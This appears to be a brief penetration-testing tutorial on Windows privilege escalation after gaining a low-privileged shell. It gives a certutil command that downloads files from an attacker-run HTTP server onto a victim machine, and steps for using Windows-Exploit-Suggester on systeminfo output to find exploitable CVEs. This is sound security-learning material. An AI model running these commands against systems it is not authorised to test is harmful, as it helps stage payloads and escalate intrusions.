This post contents is about when you get a low, unprivileged shell on a Windows Machine.
First and foremost thing is to upload files on the system.
###
    Start server on attacker machine:
    >python3 -m http.server 80 #on attacker machine
    On victim machine:
    >certutil.exe -urlcache -split -f http://<ip><port>/path/to/file

Easy way to check for privilege escalation vulnerabilties is to use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 
Steps to use Windows-Exploit-Suggester
###
    On attacker machine:
    Install xlrd python library.
    >python windows-exploit-suggester.py -update #this will create a .xls file which will contain all ms cve's   
    On victim MS machine, run systeminfo to fetch system information, and save it locally on attacking machine as sys.txt.
    Then on attacking machine use
    >python windows-exploit-suggester.py --database file.xls --systeminfo sys.txt
    It will list all the vulnerabilties. 
    Note: [E] means Exploitdb, [M] means metasploitable
